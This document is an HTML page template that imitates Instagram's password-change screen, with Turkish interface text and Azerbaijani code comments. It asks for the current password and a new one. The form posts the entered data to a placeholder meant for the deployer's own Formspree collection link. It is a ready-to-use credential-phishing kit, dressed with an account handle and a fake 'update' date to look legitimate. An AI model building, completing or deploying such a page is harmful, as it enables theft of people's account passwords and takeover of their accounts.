<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Şifreyi değiştir</title>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
        body { margin: 0; padding: 20px; background: #fff; display: flex; flex-direction: column; align-items: center; }
        .container { width: 100%; max-width: 400px; }
        .header-info { font-size: 14px; color: #262626; margin-bottom: 15px; font-weight: 500; }
        h1 { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
        .description { font-size: 14px; color: #262626; line-height: 1.4; margin-bottom: 25px; }
        
        .input-group { margin-bottom: 10px; position: relative; }
        input { 
            width: 100%; padding: 16px; border: 1px solid #dbdbdb; border-radius: 12px; 
            font-size: 14px; background: #fafafa; outline: none; transition: 0.3s;
        }
        /* Xanaya yazı yazılanda kənarları bir az tündləşsin */
        input:not(:placeholder-shown) { border-color: #a8a8a8; }
        
        #error-msg { color: #ed4956; font-size: 12px; margin-bottom: 15px; display: none; padding-left: 5px; }

        .submit-btn {
            width: 100%; padding: 14px; background-color: #b2dffc; color: #fff;
            border: none; border-radius: 25px; font-size: 16px; font-weight: 600;
            cursor: not-allowed; margin-top: 100px; position: relative;
            transition: background-color 0.3s ease;
        }
        /* Düymə tam aktiv olanda bu rəngə boyanacaq */
        .submit-btn.active { background-color: #0095f6; cursor: pointer; }

        .loader {
            display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,0.3);
            border-top-color: #fff; border-radius: 50%;
            animation: rotation 0.8s linear infinite;
            position: absolute; left: 47%; top: 25%;
        }
        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <div class="header-info">k.nsyv• Instagram</div>
    <h1>Şifreyi değiştir</h1>
    <p class="description">Şifren en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (!S@%) oluşmalıdır.</p>

    <form action="BURAYA_FORMSPREE_LINKINI_YAPISTIR" method="POST" id="passwordForm">
        <div class="input-group">
            <input type="password" name="mevcut_sifre" id="oldPass" placeholder="Mevcut şifre (Güncelleme 06.04.2026)" required>
        </div>

        <div class="input-group">
            <input type="password" name="yeni_sifre" id="newPass" placeholder="Yeni şifre" required>
        </div>

        <div class="input-group">
            <input type="password" name="yeni_sifre_tekrar" id="confirmPass" placeholder="Yeni şifreyi tekrar yaz" required>
        </div>
        <div id="error-msg">Şifre eşleşmedi</div>

        <button type="submit" id="submitBtn" class="submit-btn" disabled>
            <span id="btnText">Şifreyi değiştir</span>
            <div class="loader" id="loader"></div>
        </button>
    </form>
</div>

<script>
    const passwordForm = document.getElementById('passwordForm');
    const oldPass = document.getElementById('oldPass');
    const newPass = document.getElementById('newPass');
    const confirmPass = document.getElementById('confirmPass');
    const errorMsg = document.getElementById('error-msg');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');
    const loader = document.getElementById('loader');

    function checkInputs() {
        const v1 = oldPass.value.trim();
        const v2 = newPass.value.trim();
        const v3 = confirmPass.value.trim();

        if (v2 !== "" && v3 !== "" && v2 !== v3) {
            errorMsg.style.display = "block";
        } else {
            errorMsg.style.display = "none";
        }

        if (v1 !== "" && v2 !== "" && v3 !== "" && v2 === v3 && v2.length >= 6) {
            submitBtn.classList.add('active');
            submitBtn.disabled = false;
        } else {
            submitBtn.classList.remove('active');
            submitBtn.disabled = true;
        }
    }

    oldPass.addEventListener('input', checkInputs);
    newPass.addEventListener('input', checkInputs);
    confirmPass.addEventListener('input', checkInputs);

    // Məlumatı göndərəndə animasiyanı göstər
    passwordForm.addEventListener('submit', function() {
        btnText.style.opacity = "0";
        loader.style.display = "block";
        submitBtn.disabled = true;
    });
</script>

</body>
</html>
